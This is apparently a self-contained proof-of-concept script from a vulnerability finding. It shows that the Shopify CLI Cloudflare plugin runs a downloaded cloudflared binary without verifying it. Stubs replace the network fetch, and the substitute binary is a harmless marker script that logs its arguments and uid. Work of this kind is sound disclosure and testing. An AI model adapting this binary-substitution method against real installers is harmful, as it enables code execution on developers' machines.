#!/usr/bin/env node
import fs from 'node:fs'
import path from 'node:path'
import os from 'node:os'
import crypto from 'node:crypto'
import {execFileSync} from 'node:child_process'
import {fileURLToPath, pathToFileURL} from 'node:url'

const findingDir = path.dirname(fileURLToPath(import.meta.url))
const repoRoot = path.resolve(findingDir, '..', '..', '..')
const evidenceDir = path.join(findingDir, 'evidence')
const workDir = path.join(evidenceDir, 'work')
const installSrc = path.join(repoRoot, 'packages/plugin-cloudflare/src/install-cloudflared.ts')
const tunnelSrc = path.join(repoRoot, 'packages/plugin-cloudflare/src/tunnel.ts')

function sha256(file) {
  return crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex')
}

function writeStubs() {
  fs.mkdirSync(path.join(workDir, 'stubs'), {recursive: true})
  fs.writeFileSync(
    path.join(workDir, 'stubs/path.mjs'),
    `import path from 'node:path'\nexport const basename = path.basename\nexport const dirname = path.dirname\nexport const joinPath = path.join\n`,
  )
  fs.writeFileSync(
    path.join(workDir, 'stubs/output.mjs'),
    `export function outputDebug() {}\n`,
  )
  fs.writeFileSync(
    path.join(workDir, 'stubs/http.mjs'),
    `import {createReadStream, appendFileSync, statSync} from 'node:fs'\n` +
      `export async function fetch(url, init, mode) {\n` +
      `  appendFileSync(process.env.POC_FETCH_LOG, JSON.stringify({url: String(url), redirect: init?.redirect, mode, artifact: process.env.POC_RELEASE_ARTIFACT, bytes: statSync(process.env.POC_RELEASE_ARTIFACT).size}) + '\\n')\n` +
      `  return {ok: true, status: 200, statusText: 'OK', body: createReadStream(process.env.POC_RELEASE_ARTIFACT)}\n` +
      `}\n`,
  )
  fs.writeFileSync(
    path.join(workDir, 'stubs/fs.mjs'),
    `import {existsSync, mkdirSync as realMkdirSync, unlinkSync, createWriteStream} from 'node:fs'\n` +
      `import {chmod as realChmod, rename} from 'node:fs/promises'\n` +
      `export const fileExistsSync = existsSync\n` +
      `export function mkdirSync(p) { return realMkdirSync(p, {recursive: true}) }\n` +
      `export const unlinkFileSync = unlinkSync\n` +
      `export const createFileWriteStream = createWriteStream\n` +
      `export async function chmod(p, mode) { return realChmod(p, typeof mode === 'string' ? Number.parseInt(mode, 8) : mode) }\n` +
      `export const renameFile = rename\n`,
  )
  fs.writeFileSync(
    path.join(workDir, 'stubs/plugins-tunnel.mjs'),
    `export function startTunnel(config) { return config }\n` +
      `export class TunnelError extends Error { constructor(type, message) { super(message); this.type = type } }\n`,
  )
  fs.writeFileSync(
    path.join(workDir, 'stubs/result.mjs'),
    `export function ok(value) { return {value, valueOrAbort() { return value }} }\n` +
      `export function err(error) { return {error, valueOrAbort() { throw error }} }\n`,
  )
  fs.writeFileSync(
    path.join(workDir, 'stubs/abort.mjs'),
    `export const AbortController = globalThis.AbortController\n`,
  )
  fs.writeFileSync(
    path.join(workDir, 'stubs/context-local.mjs'),
    `export function isUnitTest() { return true }\n`,
  )
  fs.writeFileSync(
    path.join(workDir, 'stubs/error.mjs'),
    `export class BugError extends Error { constructor(message) { super(message) } }\n`,
  )
  fs.writeFileSync(
    path.join(workDir, 'stubs/system.mjs'),
    `import {spawnSync} from 'node:child_process'\n` +
      `export async function sleep(seconds) { return new Promise((resolve) => setTimeout(resolve, seconds * 1000)) }\n` +
      `export async function exec(command, args, options = {}) {\n` +
      `  const result = spawnSync(command, args, {env: process.env, cwd: process.cwd(), encoding: 'buffer'})\n` +
      `  if (options.stdout && options.stdout !== 'inherit' && result.stdout?.length) options.stdout.write(result.stdout)\n` +
      `  if (options.stderr && options.stderr !== 'inherit' && result.stderr?.length) options.stderr.write(result.stderr)\n` +
      `  if (result.error || result.status) {\n` +
      `    const error = result.error ?? new Error('process exited with code ' + result.status)\n` +
      `    if (options.externalErrorHandler) return options.externalErrorHandler(error)\n` +
      `    throw error\n` +
      `  }\n` +
      `}\n`,
  )
}

function transformInstall(source) {
  return source
    .replace("import {basename, dirname, joinPath} from '@shopify/cli-kit/node/path'", "import {basename, dirname, joinPath} from './stubs/path.mjs'")
    .replace("import {outputDebug} from '@shopify/cli-kit/node/output'", "import {outputDebug} from './stubs/output.mjs'")
    .replace("import {fetch} from '@shopify/cli-kit/node/http'", "import {fetch} from './stubs/http.mjs'")
    .replace("} from '@shopify/cli-kit/node/fs'", "} from './stubs/fs.mjs'")
    .replace("from 'url'", "from 'node:url'")
    .replace("import util from 'util'", "import util from 'node:util'")
    .replace("import {pipeline} from 'stream'", "import {pipeline} from 'node:stream'")
    .replace("from 'child_process'", "from 'node:child_process'")
    .replaceAll(': Record<string, Record<string, string>>', '')
    .replaceAll(': Record<string, string>', '')
    .replaceAll('URL[platform]![arch]', 'URL[platform][arch]')
    .replaceAll('versionNumber!', 'versionNumber')
    .replace(/: string(?=[,)])/g, '')
}

function transformTunnel(source) {
  return source
    .replace("import {TUNNEL_PROVIDER} from './provider.js'", "const TUNNEL_PROVIDER = 'cloudflare'")
    .replace("import install from './install-cloudflared.js'", "import install from './install-cloudflared.mjs'")
    .replace(/import \{[\s\S]*?\} from '@shopify\/cli-kit\/node\/plugins\/tunnel'/, "import {startTunnel, TunnelError} from './stubs/plugins-tunnel.mjs'")
    .replace("import {err, ok} from '@shopify/cli-kit/node/result'", "import {err, ok} from './stubs/result.mjs'")
    .replace("import {exec, sleep} from '@shopify/cli-kit/node/system'", "import {exec, sleep} from './stubs/system.mjs'")
    .replace("import {AbortController} from '@shopify/cli-kit/node/abort'", "import {AbortController} from './stubs/abort.mjs'")
    .replace("import {joinPath, dirname} from '@shopify/cli-kit/node/path'", "import {joinPath, dirname} from './stubs/path.mjs'")
    .replace("import {outputDebug} from '@shopify/cli-kit/node/output'", "import {outputDebug} from './stubs/output.mjs'")
    .replace("import {isUnitTest} from '@shopify/cli-kit/node/context/local'", "import {isUnitTest} from './stubs/context-local.mjs'")
    .replace("import {BugError} from '@shopify/cli-kit/node/error'", "import {BugError} from './stubs/error.mjs'")
    .replace("from 'stream'", "from 'node:stream'")
    .replace("from 'url'", "from 'node:url'")
    .replaceAll(': Promise<TunnelStartReturn>', '')
    .replaceAll(' implements TunnelClient', '')
    .replaceAll('private ', '')
    .replaceAll(': TunnelStatusType', '')
    .replaceAll(': AbortController | undefined', '')
    .replaceAll(': string[]', '')
    .replaceAll(': string | undefined', '')
    .replaceAll(': number', '')
    .replace(/\): string/g, ')')
    .replace(/: (number|string|Buffer|any)(?=[,)])/g, '')
}

async function main() {
  fs.mkdirSync(evidenceDir, {recursive: true})
  fs.rmSync(workDir, {recursive: true, force: true})
  fs.mkdirSync(workDir, {recursive: true})
  fs.writeFileSync(path.join(evidenceDir, 'setup.sh'), `#!/bin/sh\nset -eu\nnode --version\n`, {mode: 0o755})
  fs.writeFileSync(path.join(evidenceDir, 'exploit.sh'), `#!/bin/sh\nset -eu\ncd ${JSON.stringify(repoRoot)}\nnode ${JSON.stringify(path.join(findingDir, 'poc.js'))}\n`, {mode: 0o755})
  fs.writeFileSync(path.join(evidenceDir, 'setup.log'), 'Self-contained local PoC; no external service provisioning required.\n')
  fs.writeFileSync(path.join(evidenceDir, 'impact.log'), '')
  fs.writeFileSync(path.join(evidenceDir, 'fetch.log'), '')

  if (!fs.existsSync(installSrc) || !fs.existsSync(tunnelSrc)) throw new Error('plugin-cloudflare source files not found')
  if (!['linux', 'darwin'].includes(process.platform)) {
    console.log(JSON.stringify({status: 'inconclusive', evidence: 'PoC supports linux/darwin local execution', notes: `unsupported platform ${process.platform}`}))
    return
  }

  fs.writeFileSync(
    path.join(evidenceDir, 'env-info.txt'),
    [`node=${process.version}`, `platform=${process.platform}`, `arch=${process.arch}`, `hostname=${os.hostname()}`, `repo=${repoRoot}`].join('\n') + '\n',
  )
  fs.writeFileSync(
    path.join(evidenceDir, 'healthcheck.log'),
    [`install-cloudflared.ts sha256=${sha256(installSrc)}`, `tunnel.ts sha256=${sha256(tunnelSrc)}`].join('\n') + '\n',
  )

  const rawPayload = path.join(workDir, 'cloudflared')
  fs.writeFileSync(
    rawPayload,
    `#!/bin/sh\n` +
      `printf 'cloudflared payload executed\\n' >> "$POC_IMPACT_FILE"\n` +
      `printf 'argv=%s\\n' "$*" >> "$POC_IMPACT_FILE"\n` +
      `printf 'uid=%s\\n' "$(id -u)" >> "$POC_IMPACT_FILE"\n` +
      `printf '2026-05-01T00:00:00Z INF |  https://poc.trycloudflare.com\\n'\n` +
      `printf '2026-05-01T00:00:00Z INF Registered tunnel connection\\n'\n`,
    {mode: 0o755},
  )
  fs.chmodSync(rawPayload, 0o755)

  let releaseArtifact = rawPayload
  if (process.platform === 'darwin') {
    releaseArtifact = path.join(workDir, 'cloudflared-darwin.tgz')
    execFileSync('tar', ['-czf', releaseArtifact, '-C', workDir, 'cloudflared'])
  }

  writeStubs()
  fs.writeFileSync(path.join(workDir, 'install-cloudflared.mjs'), transformInstall(fs.readFileSync(installSrc, 'utf8')))
  fs.writeFileSync(path.join(workDir, 'tunnel.mjs'), transformTunnel(fs.readFileSync(tunnelSrc, 'utf8')))

  const binTarget = path.join(workDir, 'bin', 'cloudflared')
  process.env.SHOPIFY_CLI_CLOUDFLARED_PATH = binTarget
  process.env.POC_RELEASE_ARTIFACT = releaseArtifact
  process.env.POC_IMPACT_FILE = path.join(evidenceDir, 'impact.log')
  process.env.POC_FETCH_LOG = path.join(evidenceDir, 'fetch.log')

  const {hookStart} = await import(pathToFileURL(path.join(workDir, 'tunnel.mjs')).href)
  const client = (await hookStart(18181)).valueOrAbort()
  let tunnelStatus = client.getTunnelStatus()
  for (let i = 0; i < 20 && tunnelStatus.status !== 'connected'; i += 1) {
    await new Promise((resolve) => setTimeout(resolve, 50))
    tunnelStatus = client.getTunnelStatus()
  }
  await new Promise((resolve) => setTimeout(resolve, 250))

  const impact = fs.readFileSync(path.join(evidenceDir, 'impact.log'), 'utf8')
  const fetches = fs.readFileSync(path.join(evidenceDir, 'fetch.log'), 'utf8').trim()
  const installed = fs.existsSync(binTarget) ? fs.readFileSync(binTarget, 'utf8') : ''
  const marker = impact.includes('cloudflared payload executed') && tunnelStatus.status === 'connected'

  console.log(`installer fetch log: ${fetches}`)
  console.log(`installed binary: ${binTarget}`)
  console.log(`tunnel status: ${JSON.stringify(tunnelStatus)}`)
  console.log(`impact log: ${impact.trim().replaceAll('\n', ' | ')}`)
  console.log(JSON.stringify({
    status: marker ? 'confirmed' : 'failed',
    evidence: marker ? 'impact.log shows downloaded cloudflared payload executed by tunnel launcher' : 'payload execution marker missing',
    notes: installed.includes('cloudflared payload executed') ? 'downloaded bytes were written to the cloudflared bin path before execution' : 'installed payload bytes not found',
  }))
}

main().catch((error) => {
  console.error(error.stack || error.message)
  console.log(JSON.stringify({status: 'failed', evidence: 'PoC runtime error', notes: error.message}))
  process.exitCode = 1
})
